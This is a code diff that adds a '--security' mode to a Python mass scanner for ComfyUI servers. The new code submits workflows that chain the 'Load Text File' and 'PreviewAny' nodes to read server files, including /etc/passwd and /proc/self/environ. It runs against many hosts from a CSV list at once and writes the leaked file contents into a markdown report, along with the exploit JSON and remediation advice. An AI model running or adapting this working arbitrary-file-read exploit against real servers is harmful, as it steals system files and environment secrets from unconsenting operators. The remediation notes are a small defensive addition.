@@ -1,8 +1,9 @@
 #!/usr/bin/env python3
 """
-ComfyUI 批量扫描 v3
+ComfyUI 批量扫描 v3.2
 流程: 测活+详情一步完成 → 输出md报告
-用法: python3 comfyui_scan.py [-f csv] [-w 并发] [-t 超时]
+安全: --security 启用任意文件读取漏洞检测 (Load Text File + PreviewAny)
+用法: python3 comfyui_scan.py [-f csv] [-w 并发] [-t 超时] [--security]
 """
 
 import argparse, csv, json, os, ssl, socket, time
@@ -575,12 +576,285 @@ def write_output(alive):
     return md_out
 
 
+# ═══════════════════════════════════════════════════════════════════
+# 安全检测模块: 任意文件读取 (Load Text File + PreviewAny)
+# ═══════════════════════════════════════════════════════════════════
+
+SEC_PROBE_FILES = [
+    ("/etc/passwd",           "系统用户"),
+    ("/etc/hostname",         "主机名"),
+    ("/proc/self/environ",    "进程环境变量"),
+    ("/proc/self/cmdline",    "启动命令"),
+    ("/etc/resolv.conf",      "DNS配置"),
+]
+
+SEC_PROMPT_TEMPLATE = {
+    "1": {
+        "class_type": "Load Text File",
+        "inputs": {
+            "file_path": "/etc/passwd",
+            "dictionary_name": "sec_test"
+        }
+    },
+    "2": {
+        "class_type": "PreviewAny",
+        "inputs": {"source": ["1", 0]}
+    }
+}
+
+
+def sec_check_node_availability(base, timeout=5):
+    """检测节点是否安装了 Load Text File 和 PreviewAny"""
+    avail = {"Load Text File": False, "PreviewAny": False}
+    for node_type in avail:
+        try:
+            s, _, bd = fetch(f"{base}/object_info/{node_type}", timeout)
+            if s == 200:
+                data = json.loads(bd)
+                if node_type in data:
+                    avail[node_type] = True
+        except:
+            pass
+    return avail
+
+
+def sec_try_read_file(base, file_path, timeout=10):
+    """尝试通过 Load Text File + PreviewAny 读取指定文件
+    返回 (success: bool, content: str, prompt_id: str)"""
+    prompt = json.loads(json.dumps(SEC_PROMPT_TEMPLATE))
+    prompt["1"]["inputs"]["file_path"] = file_path
+
+    # 1) 提交 prompt
+    try:
+        req = Request(
+            f"{base}/prompt",
+            data=json.dumps({"prompt": prompt}).encode(),
+            headers={"User-Agent": "Mozilla/5.0", "Content-Type": "application/json"},
+            method="POST"
+        )
+        resp = urlopen(req, timeout=timeout, context=SSL_CTX)
+        if resp.status != 200:
+            return False, f"HTTP {resp.status}", ""
+        result = json.loads(resp.read(MAX_READ_BYTES))
+        prompt_id = result.get("prompt_id", "")
+        if not prompt_id:
+            return False, "无prompt_id", ""
+    except Exception as e:
+        return False, parse_err(e), ""
+
+    # 2) 等待执行完成（轮询 /history/<prompt_id>）
+    for _ in range(30):  # 最多等 30s
+        time.sleep(1)
+        try:
+            s, _, bd = fetch(f"{base}/history/{prompt_id}", timeout=5)
+            if s == 200 and bd:
+                hist = json.loads(bd)
+                if prompt_id in hist:
+                    outputs = hist[prompt_id].get("outputs", {})
+                    # 从 PreviewAny (node 2) 获取输出
+                    node2_out = outputs.get("2", {})
+                    # 文本输出可能在 text / ui / messages 字段
+                    texts = node2_out.get("text", [])
+                    if texts and isinstance(texts, list):
+                        content = "\n".join(str(t) for t in texts if t)
+                        if content.strip():
+                            return True, content, prompt_id
+                    # 尝试 ui 字段
+                    ui = node2_out.get("ui", {})
+                    if isinstance(ui, dict):
+                        ui_texts = ui.get("text", [])
+                        if ui_texts:
+                            content = "\n".join(str(t) for t in ui_texts if t)
+                            if content.strip():
+                                return True, content, prompt_id
+                    # 有输出但无文本 → 执行完成但未返回文本
+                    return False, "执行完成但无文本输出", prompt_id
+        except:
+            continue
+
+    return False, "执行超时", prompt_id
+
+
+def sec_scan_node(srv, timeout=5, read_timeout=10):
+    """对单个节点进行安全检测"""
+    base = srv["url"]
+    result = {
+        "url": base, "host": srv["host"],
+        "vuln_available": False,
+        "vuln_exploitable": False,
+        "leaked_files": [],
+        "details": []
+    }
+
+    # Step 1: 检测节点可用性
+    avail = sec_check_node_availability(base, timeout)
+    has_ltf = avail["Load Text File"]
+    has_pa = avail["PreviewAny"]
+    result["load_text_file"] = has_ltf
+    result["preview_any"] = has_pa
+
+    if not (has_ltf and has_pa):
+        result["skip_reason"] = f"缺少节点: Load Text File={'✓' if has_ltf else '✗'}, PreviewAny={'✓' if has_pa else '✗'}"
+        return result
+
+    result["vuln_available"] = True
+
+    # Step 2: 尝试读取 /etc/passwd
+    ok, content, pid = sec_try_read_file(base, "/etc/passwd", read_timeout)
+    if ok:
+        result["vuln_exploitable"] = True
+        result["leaked_files"].append({
+            "path": "/etc/passwd",
+            "desc": "系统用户",
+            "content_preview": content[:500]
+        })
+        result["details"].append(f"/etc/passwd 泄露成功 (prompt_id={pid})")
+        # 成功后再尝试读取更多文件
+        for fpath, fdesc in SEC_PROBE_FILES[1:]:  # 跳过已读的 /etc/passwd
+            ok2, content2, _ = sec_try_read_file(base, fpath, read_timeout)
+            if ok2:
+                result["leaked_files"].append({
+                    "path": fpath,
+                    "desc": fdesc,
+                    "content_preview": content2[:500]
+                })
+                result["details"].append(f"{fpath} ({fdesc}) 泄露成功")
+            else:
+                result["details"].append(f"{fpath} ({fdesc}): {content2}")
+    else:
+        result["details"].append(f"/etc/passwd 读取失败: {content}")
+
+    return result
+
+
+def sec_scan(alive_nodes, workers=10, timeout=5, read_timeout=10):
+    """对存活节点批量进行安全检测"""
+    print(f"\n{C_BOLD}{C_RED}═══ 安全检测: 任意文件读取 (Load Text File + PreviewAny) ═══{C_RESET}")
+    print(f"  检测目标: {len(alive_nodes)} 个存活节点\n")
+
+    results = []
+    checked = [0]
+    vuln_avail = [0]
+    vuln_exploit = [0]
+
+    with ThreadPoolExecutor(max_workers=workers) as pool:
+        futures = {pool.submit(sec_scan_node, srv, timeout, read_timeout): i
+                   for i, srv in enumerate(alive_nodes)}
+        for fut in as_completed(futures):
+            try:
+                r = fut.result(timeout=60)
+                results.append(r)
+                if r["vuln_available"]:
+                    vuln_avail[0] += 1
+                if r["vuln_exploitable"]:
+                    vuln_exploit[0] += 1
+            except:
+                pass
+            checked[0] += 1
+            print(f"\r  [安全检测] {checked[0]}/{len(alive_nodes)}  "
+                  f"有漏洞节点 {C_RED}{vuln_avail[0]}{C_RESET}  "
+                  f"可利用 {C_RED}{vuln_exploit[0]}{C_RESET}", end="", flush=True)
+
+    print(f"\r  [安全检测] 完成  {checked[0]}/{len(alive_nodes)}  "
+          f"有漏洞节点 {C_RED}{vuln_avail[0]}{C_RESET}  "
+          f"可利用 {C_RED}{vuln_exploit[0]}{C_RESET}       \n")
+
+    return results
+
+
+def sec_write_report(sec_results, alive_count):
+    """生成安全检测报告"""
+    out_path = os.path.join(SCRIPT_DIR, "security_report.md")
+    scan_time = time.strftime("%Y-%m-%d %H:%M:%S")
+
+    vuln_avail = [r for r in sec_results if r.get("vuln_available")]
+    vuln_exploit = [r for r in sec_results if r.get("vuln_exploitable")]
+
+    with open(out_path, "w", encoding="utf-8") as f:
+        f.write("# ComfyUI 安全检测报告\n\n")
+        f.write(f"> **检测时间**: {scan_time}\n")
+        f.write(f"> **检测范围**: {alive_count} 个存活节点\n")
+        f.write(f"> **漏洞类型**: 任意文件读取 (Path Traversal / Arbitrary File Read)\n")
+        f.write(f"> **攻击向量**: `Load Text File` + `PreviewAny` 组合节点\n\n")
+
+        f.write("## 概要\n\n")
+        f.write(f"| 指标 | 数值 |\n")
+        f.write(f"|------|------|\n")
+        f.write(f"| 存活节点 | {alive_count} |\n")
+        f.write(f"| 安装攻击所需节点 | {len(vuln_avail)} |\n")
+        f.write(f"| **可成功利用** | **{len(vuln_exploit)}** |\n")
+        f.write(f"| 利用率 | {len(vuln_exploit)/max(len(vuln_avail),1)*100:.1f}% |\n\n")
+
+        f.write("## 漏洞原理\n\n")
+        f.write("ComfyUI 的 `Load Text File` 节点可直接读取服务器本地文件，"
+                "而 `PreviewAny` 节点会将结果以文本形式返回。两者组合即构成**任意文件读取**漏洞：\n\n")
+        f.write("```json\n")
+        f.write('{\n')
+        f.write('  "1": {\n')
+        f.write('    "class_type": "Load Text File",\n')
+        f.write('    "inputs": {\n')
+        f.write('      "file_path": "/etc/passwd",\n')
+        f.write('      "dictionary_name": "sec_test"\n')
+        f.write('    }\n')
+        f.write('  },\n')
+        f.write('  "2": {\n')
+        f.write('    "class_type": "PreviewAny",\n')
+        f.write('    "inputs": {"source": ["1", 0]}\n')
+        f.write('  }\n')
+        f.write('}\n')
+        f.write("```\n\n")
+        f.write("**影响范围**: 攻击者可在无认证情况下读取服务器任意文件，"
+                "包括 `/etc/passwd`、`/proc/self/environ`、SSH 密钥、数据库配置等敏感信息。\n\n")
+
+        f.write("---\n\n## 可利用节点详情\n\n")
+        if not vuln_exploit:
+            f.write("*本次检测未发现可利用节点*\n\n")
+        else:
+            for i, r in enumerate(vuln_exploit, 1):
+                f.write(f"### {i}. `{r['host']}`\n\n")
+                for lf in r.get("leaked_files", []):
+                    f.write(f"**{lf['desc']}** (`{lf['path']}`)\n\n")
+                    f.write(f"```\n{lf['content_preview']}\n```\n\n")
+                f.write(f"<details><summary>检测详情</summary>\n\n")
+                for d in r.get("details", []):
+                    f.write(f"- {d}\n")
+                f.write(f"\n</details>\n\n")
+
+        # 仅安装了节点但未能利用的
+        avail_only = [r for r in vuln_avail if not r.get("vuln_exploitable")]
+        if avail_only:
+            f.write("---\n\n## 有漏洞节点但未能利用\n\n")
+            f.write("| # | 地址 | Load Text File | PreviewAny | 原因 |\n")
+            f.write("|---|------|---------------|------------|------|\n")
+            for i, r in enumerate(avail_only, 1):
+                ltf = "✓" if r.get("load_text_file") else "✗"
+                pa = "✓" if r.get("preview_any") else "✗"
+                reason = r.get("details", [""])[0] if r.get("details") else r.get("skip_reason", "")
+                f.write(f"| {i} | `{r['host']}` | {ltf} | {pa} | {reason} |\n")
+            f.write("\n")
+
+        f.write("---\n\n## 修复建议\n\n")
+        f.write("1. **禁用 Load Text File 节点**: 在 `custom_nodes` 中移除或禁用该节点\n")
+        f.write("2. **限制文件访问路径**: 修改节点代码，限制只能读取 `input/` 目录下的文件\n")
+        f.write("3. **启用 API 认证**: 配置 ComfyUI 的 `--listen` 和认证中间件，禁止未授权访问\n")
+        f.write("4. **网络隔离**: 将 ComfyUI 服务置于内网，不直接暴露到公网\n")
+        f.write("5. **容器化部署**: 使用 Docker 运行，限制文件系统访问范围\n")
+
+    return out_path
+
+
 def main():
     ap = argparse.ArgumentParser(description=__doc__)
     ap.add_argument("-f","--file", default=DEFAULT_CSV)
     ap.add_argument("-w","--workers", type=int, default=200)
     ap.add_argument("-t","--timeout", type=int, default=10)
     ap.add_argument("--detail-timeout", type=int, default=12)
+    ap.add_argument("--security", action="store_true",
+                    help="启用安全检测: 检测 Load Text File + PreviewAny 任意文件读取漏洞")
+    ap.add_argument("--sec-workers", type=int, default=10,
+                    help="安全检测并发数 (默认10)")
+    ap.add_argument("--sec-read-timeout", type=int, default=10,
+                    help="安全检测读取超时秒数 (默认10)")
     args = ap.parse_args()
 
     servers = load_servers(args.file)
@@ -615,6 +889,14 @@ def main():
 
     md_out = write_output(alive)
     print(f"\n{C_GREEN}报告: {md_out}{C_RESET}")
+
+    # 安全检测
+    if args.security:
+        sec_results = sec_scan(alive, workers=args.sec_workers,
+                               timeout=args.timeout,
+                               read_timeout=args.sec_read_timeout)
+        sec_out = sec_write_report(sec_results, len(alive))
+        print(f"{C_RED}安全报告: {sec_out}{C_RESET}")
 
 
 if __name__ == "__main__":
